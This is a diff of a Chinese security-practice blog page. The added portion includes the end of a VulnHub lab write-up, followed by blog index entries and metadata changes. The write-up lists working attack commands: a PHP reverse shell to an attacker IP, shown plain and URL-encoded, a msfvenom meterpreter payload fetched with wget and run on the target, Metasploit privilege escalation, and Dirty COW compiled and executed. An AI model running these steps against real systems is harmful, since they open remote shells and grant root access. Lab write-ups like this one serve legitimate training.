+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.158.129&quot;,5000);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>编码后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.158.129%22%2C5000%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27</span><br></pre></td></tr></table></figure>
+
+<p>getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="msf提权"><a href="#msf提权" class="headerlink" title="msf提权"></a>msf提权</h3><p>首先生成msf的木马</p>
+<p>kali执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.158.129 LPORT=7777 -f elf &gt; payload.elf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>然后进入msf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload php/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 0.0.0.0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lport 7777</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>靶机执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp;wget http://192.168.158.129/payload.elf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 payload.elf</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
+
+<p>连接成功，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search suggester</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605202303.png"></p>
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605202357.png"></p>
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605202709.png"></p>
+<p>使用第一个，好像成功了，但后续失败了</p>
+<p>后续使用第二个，成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/local/bpf_sign_extension_priv_esc</span><br><span class="line">show options</span><br><span class="line">set session 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605204112.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/domom/Desktop/README.md</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605204353.png"></p>
+<p>密码为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mj7AGmPR-m&amp;Vf&gt;Ry&#123;&#125;LJRBS5nc+*V.#a</span><br></pre></td></tr></table></figure>
+
+<h3 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h3><p>还是这台靶机，继续用，</p>
+<p>探测脚本如下，运行可以看到</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh">https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</a></p>
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605215241.png"></p>
+<p>首先kali,下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/40616</span><br><span class="line">mv 40616 cowroot.c</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>靶机，进行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.158.129/cowroot.c</span><br><span class="line">gcc cowroot.c -o cowroot -pthread</span><br><span class="line">chmod +x cowroot</span><br><span class="line">./cowroot</span><br></pre></td></tr></table></figure>
+
+<p>过程中会报错，但不用管</p>
+<p><img src="/2023/05/17/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/QQ%E6%88%AA%E5%9B%BE20230605211415.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/13/buu%E5%90%88%E9%9B%86-buu2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/05/13/buu%E5%90%88%E9%9B%86-buu2/" class="post-title-link" itemprop="url">buu2</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-05-13 14:05:24" itemprop="dateCreated datePublished" datetime="2023-05-13T14:05:24+08:00">2023-05-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-10-24 21:47:16" itemprop="dateModified" datetime="2023-10-24T21:47:16+08:00">2023-10-24</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.7k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>13 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>buu第二页</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/05/13/buu%E5%90%88%E9%9B%86-buu2/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/29/%E7%88%86%E7%A0%B4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
+      <meta itemprop="name" content="小zhou">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/29/%E7%88%86%E7%A0%B4/" class="post-title-link" itemprop="url">爆破</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-04-29 11:50:43" itemprop="dateCreated datePublished" datetime="2023-04-29T11:50:43+08:00">2023-04-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-07-01 23:46:24" itemprop="dateModified" datetime="2023-07-01T23:46:24+08:00">2023-07-01</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>546</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>2 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>ctfshow 爆破</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/04/29/%E7%88%86%E7%A0%B4/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/29/ctfshow%E5%90%88%E9%9B%86-%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -197,7 +883,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
+      <meta itemprop="name" content="blog">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -283,7 +969,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
+      <meta itemprop="name" content="blog">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -369,7 +1055,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
+      <meta itemprop="name" content="blog">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -455,7 +1141,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
+      <meta itemprop="name" content="blog">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -541,7 +1227,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
+      <meta itemprop="name" content="blog">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -563,7 +1249,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-23 17:49:08" itemprop="dateModified" datetime="2023-05-23T17:49:08+08:00">2023-05-23</time>
+                <time title="修改时间：2023-10-24 11:47:31" itemprop="dateModified" datetime="2023-10-24T11:47:31+08:00">2023-10-24</time>
               </span>
 
           <br>
@@ -572,14 +1258,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>617</span>
+              <span>778</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -628,7 +1314,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
+      <meta itemprop="name" content="blog">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -874,382 +1560,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/23/%E7%AE%80%E5%8D%95sql/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
-      <meta itemprop="name" content="小zhou">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/23/%E7%AE%80%E5%8D%95sql/" class="post-title-link" itemprop="url">easysql</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-03-23 21:32:11" itemprop="dateCreated datePublished" datetime="2023-03-23T21:32:11+08:00">2023-03-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-08-03 18:16:23" itemprop="dateModified" datetime="2023-08-03T18:16:23+08:00">2023-08-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/sql/" itemprop="url" rel="index"><span itemprop="name">sql</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.5k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>6 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p> 我是菜狗。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/03/23/%E7%AE%80%E5%8D%95sql/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/17/linux/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
-      <meta itemprop="name" content="小zhou">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/17/linux/" class="post-title-link" itemprop="url">linux问题</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-03-17 20:19:01" itemprop="dateCreated datePublished" datetime="2023-03-17T20:19:01+08:00">2023-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-09-23 18:54:15" itemprop="dateModified" datetime="2023-09-23T18:54:15+08:00">2023-09-23</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>557</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>linux使用遇见的问题</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/03/17/linux/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/16/ctfshow%E5%90%88%E9%9B%86-ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
-      <meta itemprop="name" content="小zhou">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/16/ctfshow%E5%90%88%E9%9B%86-ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-title-link" itemprop="url">ctfshow代码审计</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-03-16 14:34:52" itemprop="dateCreated datePublished" datetime="2023-03-16T14:34:52+08:00">2023-03-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-16 16:06:31" itemprop="dateModified" datetime="2023-04-16T16:06:31+08:00">2023-04-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>代码审计</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/03/16/ctfshow%E5%90%88%E9%9B%86-ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/15/ctfshow%E5%90%88%E9%9B%86-jwt/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/QQ%E5%9B%BE%E7%89%8720230109005650.jpg">
-      <meta itemprop="name" content="小zhou">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="not coder">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/15/ctfshow%E5%90%88%E9%9B%86-jwt/" class="post-title-link" itemprop="url">jwt</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-03-15 18:57:42" itemprop="dateCreated datePublished" datetime="2023-03-15T18:57:42+08:00">2023-03-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-05 15:35:57" itemprop="dateModified" datetime="2023-04-05T15:35:57+08:00">2023-04-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/ctfshow/" itemprop="url" rel="index"><span itemprop="name">ctfshow</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>453</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>   ctfshow jwt</p>
-<p>​</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/03/15/ctfshow%E5%90%88%E9%9B%86-jwt/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1317,7 +1631,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">60</span>
+          <span class="site-state-item-count">64</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1366,12 +1680,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">82k</span>
+    <span title="站点总字数">87k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:58</span>
+    <span title="站点阅读时长">5:16</span>
 </div>
 
 <!--
